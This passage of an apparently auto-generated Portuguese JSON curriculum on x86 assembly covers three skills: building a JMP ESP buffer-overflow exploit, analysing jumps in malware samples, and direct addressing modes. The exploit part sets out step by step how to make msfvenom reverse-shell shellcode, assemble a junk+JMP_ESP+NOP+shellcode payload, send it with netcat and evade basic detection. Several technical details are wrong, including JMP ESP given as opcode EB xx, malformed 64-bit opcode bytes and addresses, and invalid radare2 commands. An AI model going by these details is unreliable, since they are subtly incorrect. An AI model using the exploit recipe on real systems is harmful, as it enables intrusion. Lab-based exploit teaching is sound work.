                                  "verification": "Executar gdb na app e confirmar que ela roda sem proteções, input causa segfault previsível.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "VMware/VirtualBox, gdb, gcc, nasm, Metasploit.",
                                  "tips": "Use scripts para automatizar setup e evitar perda de tempo em recompilações.",
                                  "learningObjective": "Preparar um ambiente isolado e reproduzível para exploração segura.",
                                  "commonMistakes": "Esquecer de desabilitar ASLR/NX, levando a exploits imprevisíveis."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Binário e Identificar JMP Adequado",
                                  "subSteps": [
                                    "Desmontar binário com objdump -d ou gdb para encontrar endereço de JMP ESP/CALL ESP.",
                                    "Identificar offset do buffer overflow via pattern_create (cyclic em pwntools ou Metasploit).",
                                    "Confirmar EIP overwrite com gdb (pattern_offset).",
                                    "Listar gadgets JMP usando ROPgadget ou manualmente em disassembly.",
                                    "Notar endereço base do binário para cálculos relativos."
                                  ],
                                  "verification": "Em gdb, input overflow deve sobrepor EIP com valor controlado (ex: 0x41414141).",
                                  "estimatedTime": "45 minutos",
                                  "materials": "gdb, objdump, ROPgadget, pwntools.",
                                  "tips": "Salve disassembly em arquivo para referência rápida.",
                                  "learningObjective": "Dominar análise estática/dinâmica para encontrar pontos de controle de fluxo.",
                                  "commonMistakes": "Offset incorreto devido a alinhamento stack ou argumentos função."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Criar Shellcode com JMP para Bypass",
                                  "subSteps": [
                                    "Gerar shellcode base com msfvenom (ex: linux/x86/shell_reverse_tcp).",
                                    "Adicionar JMP ESP no início do shellcode para redirecionar execução (opcode EB xx).",
                                    "Calcular offset JMP: distância até shellcode após JMP.",
                                    "Assemblar manualmente com nasm: jmp esp; <shellcode>.",
                                    "Codificar shellcode em Python para evitar null bytes (ex: struct.pack).",
                                    "Testar shellcode isolado em gdb para validar."
                                  ],
                                  "verification": "Shellcode roda em gdb sem crash, JMP pula corretamente para payload.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "msfvenom, nasm, Python, gdb.",
                                  "tips": "Use \r\n para alinhar stack se necessário em overflows.",
                                  "learningObjective": "Construir shellcode polimórfico usando JMP para evasão de detecção.",
                                  "commonMistakes": "Null bytes (\u0000) no shellcode quebram string overflow."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Montar e Executar Payload de Injeção",
                                  "subSteps": [
                                    "Construir payload: junk (offset) + JMP_ESP_addr + NOP_sled + shellcode.",
                                    "Enviar via netcat ou Python socket para app vulnerável.",
                                    "Monitorar com gdb ou netstat para reverse shell.",
                                    "Alternativa: Usar Metasploit exploit com custom JMP payload.",
                                    "Depurar crashes ajustando endereços ou padding."
                                  ],
                                  "verification": "Reverse shell conecta de volta, comandos executam (ex: whoami).",
                                  "estimatedTime": "45 minutos",
                                  "materials": "netcat, Python, Metasploit, gdb.",
                                  "tips": "Adicione NOP sled (0x90) para maior tolerância a overflows imprecisos.",
                                  "learningObjective": "Integrar análise e shellcode em exploit funcional.",
                                  "commonMistakes": "Endereço JMP incorreto devido a PIE ou relocação."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Verificar Bypass e Limpar Ambiente",
                                  "subSteps": [
                                    "Confirmar bypass de controle de fluxo: trace EIP em gdb pula para shellcode.",
                                    "Testar com proteções on (parcial ASLR) usando leaks ou ROP chains.",
                                    "Documentar exploit em relatório (offsets, shellcode hex).",
                                    "Resetar VM e testar reprodutibilidade.",
                                    "Explorar variações: JMP CALL, JMP EAX."
                                  ],
                                  "verification": "Exploit consistente em 5+ runs, shell abre sem falhas.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "gdb, scripts de reset.",
                                  "tips": "Grave sessão gdb com 'set logging on' para análise posterior.",
                                  "learningObjective": "Validar eficácia e robustez do bypass JMP.",
                                  "commonMistakes": "Ignorar stack canary ou W^X em testes avançados."
                                }
                              ],
                              "practicalExample": "Em uma app C com strcpy(buffer), envie 100 'A's + addr_JMP_ESP (0x080484c4) + 20 NOPs + shellcode reverse_tcp. gdb mostra EIP -> JMP_ESP -> shellcode, abrindo nc -lvnp 4444.",
                              "finalVerifications": [
                                "EIP é sobrescrito e JMP executa sem crash.",
                                "Shellcode roda, reverse shell conecta.",
                                "Exploit funciona em 90%+ das tentativas.",
                                "Sem detecção por ferramentas básicas (strings, hexdump).",
                                "Documentação inclui hex dump do payload.",
                                "Ambiente reseta limpo após teste."
                              ],
                              "assessmentCriteria": [
                                "Precisão do offset e endereço JMP (erro < 4 bytes).",
                                "Shellcode sem null bytes e tamanho < 200 bytes.",
                                "Bypass comprovado via gdb trace.",
                                "Relatório com screenshots de shell e disassembly.",
                                "Teste manual e Metasploit ambos funcionais.",
                                "Tratamento de edge cases (alinhamento stack)."
                              ],
                              "crossCurricularConnections": [
                                "Assembly x86: Entendimento de opcodes JMP (EB, E9).",
                                "Programação C: Exploração de vulnerabilidades em funções unsafe.",
                                "Redes: Reverse shells via TCP/UDP.",
                                "Ferramentas DevOps: Automação com Python/pwntools.",
                                "Ética em Segurança: Ênfase em ambientes controlados."
                              ],
                              "realWorldApplication": "Em pentests éticos (CTFs, bug bounties), identificar ROP/JMP gadgets para bypass DEP/ASLR em exploits reais, como em serviços web vulneráveis ou firmwares IoT."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.2.4.4",
                            "name": "Analisar JMP em binários reais",
                            "description": "Desmontar ELF/PE com radare2 ou IDA, identificando JMP em loops ou redirecionamentos de execução em malware.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente e obter binário de exemplo",
                                  "subSteps": [
                                    "Instale radare2 via gerenciador de pacotes (ex: apt install radare2 no Linux).",
                                    "Baixe um binário ELF/PE de malware de amostra de repositórios como VirusShare ou MalwareBazaar (use VM isolada).",
                                    "Configure uma VM com ferramentas de análise estática para segurança.",
                                    "Verifique a integridade do binário com hash SHA256.",
                                    "Execute 'r2 -A sample.bin' para análise inicial automática."
                                  ],
                                  "verification": "Ambiente pronto se radare2 inicia sem erros e binário carrega com 'aaa' command.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Radare2 instalado, VM (VirtualBox/VMware), binário malware ELF/PE de amostra.",
                                  "tips": "Sempre use VM snapshot para resetar ambiente após análise.",
                                  "learningObjective": "Configurar ambiente seguro para análise de binários maliciosos.",
                                  "commonMistakes": "Executar binário diretamente sem sandbox; ignorar detecção de AV falsa positiva."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Carregar e desmontar o binário",
                                  "subSteps": [
                                    "Abra o binário: 'r2 -A sample.elf' (flag -A para análise automática).",
                                    "Use 'aaa' para análise profunda, 'afl' para listar funções.",
                                    "Navegue para main: 's sym.main' ou 'pdf @ main'.",
                                    "Visualize grafo: 'VV' ou 'v' para modo visual.",
                                    "Anote endereços de funções suspeitas com 'afn nome @ addr'."
                                  ],
                                  "verification": "Desmontagem completa se funções e cross-refs são listadas via 'afl' e 'ax'.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Radare2, binário ELF/PE.",
                                  "tips": "Use 'pd 50' para disassemble próximo 50 instruções; salve sessão com 'w! r2project'.",
                                  "learningObjective": "Dominar desmontagem inicial de ELF/PE para visualização de código assembly.",
                                  "commonMistakes": "Pular análise automática (-A/aaa), levando a refs incompletas; confundir seções .text/.data."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar e analisar JMPs em loops",
                                  "subSteps": [
                                    "Busque JMPs: '/ jmp' ou '/ j' no radare2 para grep instruções.",
                                    "Analise loops: procure padrões como JMP backward (ex: jmp <addr menor).",
                                    "Use 'pF' para printar com flags ou 'VV' para grafo de controle.",
                                    "Trace execução: 'dcu 0xaddr' para debug até JMP.",
                                    "Documente: '/R+ jmp_loop' para renomear referência."
                                  ],
                                  "verification": "Loops identificados se grafo mostra ciclos com JMP condicionais (JA/JB/JE).",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Radare2 com binário carregado.",
                                  "tips": "Foco em JMP relativos curtos para loops locais; use 'dr=pc' para step debug.",
                                  "learningObjective": "Reconhecer JMPs que formam estruturas de loop em assembly.",
                                  "commonMistakes": "Ignorar JMPs condicionais (JE/JNE); confundir com CALLs."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar JMPs em redirecionamentos de execução (malware)",
                                  "subSteps": [
                                    "Procure JMPs dinâmicos: '/ jmp rax' ou JMP reg/indiretos.",
                                    "Identifique shellcode: JMP para áreas não-executáveis ou heap.",
                                    "Verifique cross-refs: 'ax @ 0xaddr' para quem salta para onde.",
                                    "Simule fluxo: 'aeip @ entry0; aec' para emulação.",
                                    "Compare com IDA se disponível para validação."
                                  ],
                                  "verification": "Redirecionamentos confirmados se refs mostram saltos para código ofuscado ou payloads.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Radare2, opcional IDA Free.",
                                  "tips": "JMPs para regs como RAX indicam ROP ou shellcode; salve notas em 'CCu comentário'.",
                                  "learningObjective": "Detectar JMPs usados em ofuscação ou bypass de execução em malware.",
                                  "commonMistakes": "Não checar refs dinâmicas; assumir todos JMPs são benignos."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Documentar e validar análise",
                                  "subSteps": [
                                    "Exporte grafo: 'VV> graph.png'.",
                                    "Crie relatório: liste JMPs com addr, target, tipo (loop/redirect).",
                                    "Teste hipótese: altere JMP para NOP e veja mudança ('wa nop @ addr').",
                                    "Valide com strings: 'iz' ou VirusTotal para contexto malware.",
                                    "Salve projeto: '.r2project'."
                                  ],
                                  "verification": "Relatório completo com screenshots e explicações de 3+ JMPs analisados.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Editor de texto, ferramentas de screenshot.",
                                  "tips": "Use templates de relatório para consistência; compartilhe anonimamente em fóruns.",
                                  "learningObjective": "Sintetizar análise de JMPs em relatório acionável.",
                                  "commonMistakes": "Falta de evidências visuais; não validar com múltiplas tools."
                                }
                              ],
                              "practicalExample": "Em um malware ELF de ransomware baixado de MalwareBazaar, identifique um loop JMP backward em 0x401200 que criptografa arquivos (JA para loop), e um JMP RAX em 0x401500 redirecionando para shellcode decodificado na heap, permitindo bypass de detecção AV.",
                              "finalVerifications": [
                                "Identificou pelo menos 3 JMPs com contexto correto (loop ou redirect).",
                                "Grafo de controle mostra fluxos alterados por JMPs.",
                                "Refs cruzadas validadas sem falsos positivos.",
                                "Relatório documenta impactos em execução malware.",
                                "Análise reproduzível em VM limpa.",
                                "Nenhum erro em emulação de JMPs."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de JMPs condicionais vs incondicionais (90%+).",
                                "Profundidade de análise de refs e contexto malware.",
                                "Uso correto de comandos radare2 (sem erros de sintaxe).",
                                "Qualidade do relatório com visuais e explicações claras.",
                                "Tempo de análise eficiente dentro dos estimados.",
                                "Detecção de ofuscação via JMPs indiretos."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly: Entender loops como while(for).",
                                "Sistemas Operacionais: Gerenciamento de memória e execução (ASLR bypass).",
                                "Criptografia: JMPs em rotinas de descriptografia malware.",
                                "Redes: Análise de C2 em binários com redirecionamentos.",
                                "Engenharia Reversa: Ferramentas como Ghidra complementares."
                              ],
                              "realWorldApplication": "Em equipes de Threat Hunting/SOC, analistas usam isso para dissecar malware como Emotet ou TrickBot, identificando JMPs ofuscados para criar YARA rules ou IOCs, prevenindo infecções em endpoints corporativos."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.2.3",
                    "name": "Modos de Endereçamento",
                    "description": "Tipos de modos de endereçamento direto, indireto, indexado e baseados em registradores.",
                    "individualConcepts": [
                      {
                        "id": "10.1.2.3.1",
                        "name": "Modo de Endereçamento Direto",
                        "description": "O modo de endereçamento direto especifica o endereço de memória diretamente na instrução, sem uso de registradores ou cálculos adicionais, comum em Assembly x86 (32 bits) e x86-64, permitindo acesso imediato a dados ou código em um endereço fixo.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.3.1.1",
                            "name": "Identificar sintaxe de modo direto em Assembly x86",
                            "description": "Reconhecer instruções como MOV eax, [0x400000] em Assembly 32 bits e MOV rax, [rip + offset] em 64 bits, entendendo que o endereço é codificado diretamente no opcode para acesso imediato à memória.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Conceitos Básicos de Modos de Endereçamento em x86",
                                  "subSteps": [
                                    "Estude a definição de modo de endereçamento direto: o endereço de memória é especificado diretamente como um valor absoluto ou relativo no opcode da instrução.",
                                    "Compare com outros modos: imediato (valor direto no registrador), registrador-indireto ([reg]) e baseado/indexado.",
                                    "Identifique o propósito: permite acesso rápido a endereços fixos de memória sem cálculos em runtime.",
                                    "Revise a evolução de 32 para 64 bits: 32-bit usa endereços absolutos de 32 bits; 64-bit prefere RIP-relative para position-independent code.",
                                    "Anote exemplos genéricos: [addr] vs. imm."
                                  ],
                                  "verification": "Escreva uma definição própria e liste 3 diferenças para outros modos.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação Intel x86 manuals (Vol. 2)",
                                    "Vídeo introdutório sobre modos de endereçamento x86"
                                  ],
                                  "tips": [
                                    "Foquem em 'direto = endereço explícito na instrução' para fixar o conceito."
                                  ],
                                  "learningObjective": "Definir modo direto e diferenciá-lo de outros modos de endereçamento.",
                                  "commonMistakes": [
                                    "Confundir modo direto com modo imediato (valores literais vs. endereços de memória)",
                                    "Ignorar diferenças entre 32 e 64 bits"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar a Sintaxe do Modo Direto em Assembly 32 bits",
                                  "subSteps": [
                                    "Examine instruções como MOV eax, [0x400000]: colchetes [] indicam dereferência de memória, 0x400000 é endereço absoluto de 32 bits.",
                                    "Identifique componentes: registrador destino (eax), operador (MOV), endereço direto dentro de [].",
                                    "Decodifique o opcode: prefixo ModR/M com mod=00 para direct, seguido pelo displacement de 32 bits.",
                                    "Pratique lendo: [0x401000] é direto; valor após [] é o endereço exato.",
                                    "Teste com variações: MOV [0x400000], ebx (escrita em memória)."
                                  ],
                                  "verification": "Parse 3 instruções 32-bit e destaque o endereço direto.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Compilador NASM ou MASM",
                                    "Exemplos de código assembly 32-bit"
                                  ],
                                  "tips": [
                                    "Sempre verifique os colchetes [] como sinal de memória; sem eles é imediato."
                                  ],
                                  "learningObjective": "Reconhecer e parsear sintaxe direta em 32 bits.",
                                  "commonMistakes": [
                                    "Interpretar 0x400000 como valor imediato ao invés de endereço",
                                    "Esquecer que eax é 32-bit apenas"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar a Sintaxe do Modo Direto em Assembly 64 bits",
                                  "subSteps": [
                                    "Estude MOV rax, [rip + 0x1234]: usa RIP-relative (rip é registrador de instruction pointer), offset é displacement relativo.",
                                    "Compare com absoluto: MOV rax, [abs 0x4000000000] requer prefixo 64-bit address-size.",
                                    "Identifique sintaxe: [rip + offset] ou [rip - offset] para forward/backward jumps.",
                                    "Decodifique: ModR/M com RIP como base, displacement variável (1,4,8 bytes).",
                                    "Pratique: Diferencie de 32-bit pela presença de 'rip' e registradores 64-bit como rax."
                                  ],
                                  "verification": "Identifique modo direto em 5 snippets 64-bit e explique RIP-relative.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação AMD64 manual",
                                    "Ferramenta objdump para disasm de binários 64-bit"
                                  ],
                                  "tips": [
                                    "Em 64-bit, 'rip' é chave para direct moderno; absoluto é raro sem prefixos."
                                  ],
                                  "learningObjective": "Reconhecer sintaxe direta em 64 bits, enfatizando RIP-relative.",
                                  "commonMistakes": [
                                    "Confundir RIP-relative com indireto via registrador",
                                    "Usar sintaxe 32-bit em 64-bit sem ajustes"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar Identificação e Comparação entre 32 e 64 bits",
                                  "subSteps": [
                                    "Colete snippets mistos: identifique MOV eax, [0x400000] (32-bit direct) vs. MOV rax, [rip+0x10] (64-bit).",
                                    "Compare: 32-bit usa endereço fixo; 64-bit usa relativo para relocatability.",
                                    "Exercícios: Marque instruções como 'direto' ou não em um código de 20 linhas.",
                                    "Simule em debugger: Use GDB para step e ver valores de memória acessados.",
                                    "Crie seu exemplo: Escreva 2 instruções directas em cada arquitetura."
                                  ],
                                  "verification": "Corretamente classifique 10 instruções mistas como modo direto ou não.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "GDB ou x64dbg debugger",
                                    "Snippets de assembly de CTFs ou binários reais"
                                  ],
                                  "tips": [
                                    "Use 'objdump -d' para gerar disasm e praticar leitura rápida."
                                  ],
                                  "learningObjective": "Identificar e diferenciar sintaxe direta em ambos os formatos.",
                                  "commonMistakes": [
                                    "Não notar registradores (eax vs rax) como pista de arquitetura",
                                    "Ignorar offsets negativos em RIP"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário 32-bit: 'mov eax, [0x401000]' carrega o dword em 0x401000 para eax. Em 64-bit: 'mov rax, [rip + 0x200]' carrega de endereço calculado como RIP atual + 0x200. Use objdump em /bin/ls para encontrar exemplos reais.",
                              "finalVerifications": [
                                "Parse corretamente 5 instruções 32-bit e 5 de 64-bit como modo direto.",
                                "Explique RIP-relative vs absoluto em suas palavras.",
                                "Identifique modo direto em um disasm de 50 linhas sem erros.",
                                "Diferencie de modos indireto/imediato em exemplos mistos.",
                                "Debug uma instrução direta em GDB e confirme acesso à memória.",
                                "Crie e compile sua própria instrução direta em NASM para ambas arquiteturas."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de sintaxe direta (90%+ acertos).",
                                "Compreensão de diferenças 32/64 bits demonstrada em explicações.",
                                "Uso correto de terminologia (RIP-relative, displacement, ModR/M).",
                                "Capacidade de parsear opcodes básicos sem ferramentas.",
                                "Aplicação em debuggers para verificação prática.",
                                "Criatividade em exemplos próprios sem erros de sintaxe."
                              ],
                              "crossCurricularConnections": [
                                "Programação de Sistemas: Entendimento de loaders e relocations em binários.",
                                "Segurança Computacional: Detecção de ROP gadgets usando direct addressing.",
                                "Arquitetura de Computadores: Estudo de pipelines e cache em acessos diretos.",
                                "Engenharia Reversa: Análise de malware com modos de endereçamento.",
                                "Desenvolvimento de Compiladores: Geração de código assembly otimizado."
                              ],
                              "realWorldApplication": "Em análise de malware ou reverse engineering, identificar modo direto ajuda a mapear strings hardcoded ou chaves em memória (ex: [0x401000] para segredo), facilitando extração em ferramentas como IDA Pro ou Ghidra durante pentests e forensics digitais."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.3.1.2",
                            "name": "Calcular endereço efetivo em modo direto",
                            "description": "Determinar o endereço de memória final a partir da instrução direta, considerando alinhamento de 4 bytes em 32 bits e 8 bytes em 64 bits, e impactos em buffer overflows ou análise de shellcodes.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender o Modo de Endereçamento Direto e sua Representação em Instruções",
                                  "subSteps": [
                                    "Leia a definição de modo direto: o endereço de memória é especificado diretamente na instrução sem registradores ou deslocamentos.",
                                    "Estude exemplos em Assembly x86-32: ex. MOV EAX, [0x8048400] onde 0x8048400 é o endereço efetivo.",
                                    "Compare com x86-64: ex. MOV RAX, [rip+0x1234] mas foque em absolute direto como MOV EAX, [0x400000].",
                                    "Anote diferenças de alinhamento: dados/instruções alinhados em 4 bytes (32-bit) ou 8 bytes (64-bit).",
                                    "Desenhe um diagrama da estrutura da instrução: opcode + endereço (32-bit ou 64-bit dependendo da arquitetura)."
                                  ],
                                  "verification": "Crie um resumo de 1 parágrafo explicando modo direto vs indireto, com 2 exemplos por arquitetura.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação Intel x86 manuals (Vol. 2)",
                                    "Ferramenta objdump ou ndisasm para decodificar binários simples"
                                  ],
                                  "tips": "Sempre verifique o manual da CPU para variações RIP-relative em 64-bit, que não é 'puro' direto.",
                                  "learningObjective": "Identificar e descrever instruções em modo direto em ambas as arquiteturas.",
                                  "commonMistakes": [
                                    "Confundir modo direto com imediato",
                                    "Ignorar endianness ao ler endereços hexadecimais"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Calcular Endereço Efetivo em Instruções 32-bit",
                                  "subSteps": [
                                    "Use objdump para disassemblar um binário 32-bit simples com instruções diretas.",
                                    "Identifique o offset da instrução no código e extraia o endereço operand (geralmente 4 bytes após opcode).",
                                    "Some o endereço base do segmento (ex. .text section) ao offset para endereço virtual completo.",
                                    "Verifique alinhamento: endereço deve ser múltiplo de 4 bytes para acessos word/dword.",
                                    "Teste com exemplo: se instrução em 0x8048300 é MOV [0x8048400], EAX, endereço efetivo é 0x8048400."
                                  ],
                                  "verification": "Calcule endereço efetivo de 3 instruções disassembladas e valide com gdb 'x/i' ou 'info reg'.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "GCC para compilar asm32 simples",
                                    "GDB debugger",
                                    "Binário de teste com modo direto"
                                  ],
                                  "tips": "Use 'objdump -d binary' e anote offsets hexadecimais com precisão.",
                                  "learningObjective": "Calcular precisamente endereço efetivo em x86-32 considerando offsets e alinhamento.",
                                  "commonMistakes": [
                                    "Esquecer de somar offset da instrução ao endereço base",
                                    "Não converter little-endian corretamente"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Calcular Endereço Efetivo em Instruções 64-bit e Diferenças de Alinhamento",
                                  "subSteps": [
                                    "Compile e disassemble um binário 64-bit com endereços absolutos (use -m64).",
                                    "Note que endereços são 8 bytes, alinhados em 8 bytes; RIP-relative é comum mas distinga direto.",
                                    "Extraia endereço de 8 bytes do opcode e calcule VA: base + offset + endereço codificado.",
                                    "Compare alinhamentos: teste acessos desalinhados causando #GP em 64-bit para dados maiores.",
                                    "Pratique com exemplo: MOV [0x555555554000], RAX em offset 0x1000 resulta em EA 0x555555554000."
                                  ],
                                  "verification": "Em GDB 64-bit, defina breakpoint na instrução e use 'x/gx $rip' para confirmar EA.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "GCC com -m64",
                                    "GDB para x86-64",
                                    "Exemplos de shellcode 64-bit"
                                  ],
                                  "tips": "Em 64-bit, absolute addressing é raro fora de position-independent code; foque em relativos quando aplicável.",
                                  "learningObjective": "Diferenciar e calcular EAs em x86-64, enfatizando alinhamento de 8 bytes.",
                                  "commonMistakes": [
                                    "Assumir 4-byte endereços em 64-bit",
                                    "Ignorar ASLR afetando bases reais"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar Cálculo em Análise de Buffer Overflows e Shellcodes",
                                  "subSteps": [
                                    "Analise um shellcode simples com jumps diretos para labels (calcula EA como label address).",
                                    "Simule buffer overflow: calcule EA de return address overwrite para ROP gadget direto.",
                                    "Use pwndbg ou GDB para tracear acessos memoriais e detectar overflows via desalinhamento.",
                                    "Teste impacto: payload desalinhado causa segfault; ajuste para 4/8 bytes alignment.",
                                    "Documente caso: em vuln32, overwrite EA 0x08048400 para shellcode handler."
                                  ],
                                  "verification": "Crie e execute um exploit PoC onde EA calculado corretamente bypassa buffer check.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Python pwntools para crafting payloads",
                                    "Vuln binary com buffer overflow",
                                    "GDB-PEDA/Pwndbg"
                                  ],
                                  "tips": "Sempre padronize payloads com NOPs para alinhamento em overflows.",
                                  "learningObjective": "Integrar cálculo de EA em cenários de exploração de segurança.",
                                  "commonMistakes": [
                                    "Não considerar stack alignment em overflows",
                                    "Erros de off-by-one em EAs de shellcode"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário 32-bit, instrução em offset 0x08048400: 8B 04 25 00 40 48 00 (MOV EAX,[0x00484000]). Endereço efetivo = 0x00484000 (little-endian: 00 40 48 00). Em 64-bit similar, mas 8 bytes: 48 8B 04 25 00 00 40 00 55 55 (EA=0x5555400000). Teste overflow: se buffer em 0x00484000-0x20, overwrite EA direto causa EIP control.",
                              "finalVerifications": [
                                "Calcule EA corretamente para 5 instruções mistas 32/64-bit sem erros.",
                                "Explique impacto de desalinhamento em acessos memoriais com exemplo.",
                                "Trace um shellcode em GDB identificando todos EAs diretos.",
                                "Simule buffer overflow ajustando EA para alignment correto.",
                                "Compare EAs em 32 vs 64-bit para mesma lógica de código.",
                                "Valide com disassembler que offsets somam ao EA virtual exato."
                              ],
                              "assessmentCriteria": [
                                "Precisão no cálculo de EA (100% correto em testes).",
                                "Compreensão de alinhamento 4/8 bytes e suas falhas.",
                                "Aplicação correta em cenários de segurança (overflow/shellcode).",
                                "Uso fluente de ferramentas (objdump/GDB) para verificação.",
                                "Explicação clara de diferenças arquiteturais.",
                                "Identificação de erros comuns em análise prática."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Entender ponteiros e alinhamento de structs/malloc.",
                                "Sistemas Operacionais: Gerenciamento de memória virtual e ASLR.",
                                "Redes/Reverse Engineering: Análise de binários maliciosos com Radare2/IDA.",
                                "Matemática: Operações em base 16 e aritmética modular para offsets.",
                                "Segurança de Software: Mitigações como DEP/NX em EAs de shellcode."
                              ],
                              "realWorldApplication": "Em pentesting/reverse engineering, calcular EAs diretos permite mapear shellcodes em exploits (ex. CTF ROP chains), detectar buffer overflows em binários vulneráveis, e analisar malwares onde jumps diretos revelam payloads escondidos, essencial para ferramentas como ROPgadget ou exploit-db PoCs."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.3.1.3",
                            "name": "Comparar modo direto em 32 e 64 bits",
                            "description": "Analisar diferenças entre endereçamento absoluto em x86 (32 bits) e RIP-relativo em x86-64, com exemplos de desmontagem usando ferramentas como objdump para formatos ELF/PE.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar Endereçamento Absoluto Direto em x86 32 bits",
                                  "subSteps": [
                                    "Estude a sintaxe de instruções como MOV eax, [0x12345678] onde o endereço é codificado diretamente no opcode.",
                                    "Identifique como o endereço de 32 bits é resolvido em tempo de execução sem dependência do registrador de instrução.",
                                    "Analise o impacto no tamanho do opcode e na relocabilidade do código.",
                                    "Examine exemplos em assembly usando NASM ou GAS para gerar binários ELF 32 bits.",
                                    "Verifique o deslocamento de bytes no opcode com hexdump."
                                  ],
                                  "verification": "Gere um binário 32 bits simples e confirme com objdump -d que o endereço aparece como absoluto.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Compilador GCC 32 bits (multilib)",
                                    "NASM ou GAS",
                                    "objdump",
                                    "hexdump"
                                  ],
                                  "tips": "Use flags -m32 no GCC para forçar 32 bits; foque em instruções como MOV e JMP diretas.",
                                  "learningObjective": "Compreender como endereços absolutos são embutidos diretamente em 32 bits.",
                                  "commonMistakes": [
                                    "Confundir com endereçamento relativo",
                                    "Ignorar alinhamento de bytes no opcode",
                                    "Não considerar limites de endereço em 32 bits"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Entender Endereçamento RIP-Relativo Direto em x86-64",
                                  "subSteps": [
                                    "Aprenda que em 64 bits, endereços absolutos diretos foram depreciados; use RIP + offset para relocabilidade.",
                                    "Estude a sintaxe como MOV rax, [rip + 0x1234] onde o offset é calculado em relação ao RIP.",
                                    "Analise como o RIP aponta para a próxima instrução, permitindo offsets pequenos (±2GB).",
                                    "Gere código assembly 64 bits com RIP-relativo usando NASM.",
                                    "Examine o opcode com objdump para ver o modRM byte indicando RIP-relativo (0x25 para 32-bit disp)."
                                  ],
                                  "verification": "Compile um binário 64 bits e use objdump -d para ver 'rip-relative' na desmontagem.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "GCC padrão (64 bits)",
                                    "NASM",
                                    "objdump"
                                  ],
                                  "tips": "Evite usar -fPIE; compile estático para simplicidade inicial.",
                                  "learningObjective": "Dominar o mecanismo RIP-relativo como substituto do absoluto em 64 bits.",
                                  "commonMistakes": [
                                    "Assumir endereçamento absoluto ainda suportado",
                                    "Confundir offset com endereço absoluto",
                                    "Não ajustar offsets para tamanho da instrução"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Comparar Diferenças entre 32 e 64 bits",
                                  "subSteps": [
                                    "Liste diferenças chave: absoluto vs. RIP-relativo, tamanho de offset (32 vs. 32-bit signed), relocabilidade.",
                                    "Compare impacto em ASLR (Address Space Layout Randomization): 64 bits mais seguro.",
                                    "Analise tamanhos de instrução: RIP adiciona flexibilidade sem aumentar opcode.",
                                    "Crie uma tabela comparativa de opcodes para MOV direto em ambos os modos.",
                                    "Discuta exceções: quando absolutos ainda são usados em 64 bits (e.g., com registradores base)."
                                  ],
                                  "verification": "Crie uma tabela ou diagrama resumindo 5 diferenças principais e valide com exemplos desmontados.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Papel ou ferramenta como Draw.io",
                                    "Exemplos de binários de steps anteriores"
                                  ],
                                  "tips": "Use diff em saídas de objdump de binários 32/64 para destacar diferenças.",
                                  "learningObjective": "Identificar e explicar diferenças funcionais e de segurança entre os modos.",
                                  "commonMistakes": [
                                    "Ignorar benefícios de relocabilidade em 64 bits",
                                    "Confundir RIP com EIP",
                                    "Subestimar limites de offset RIP"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar Desmontagem com objdump em ELF e PE",
                                  "subSteps": [
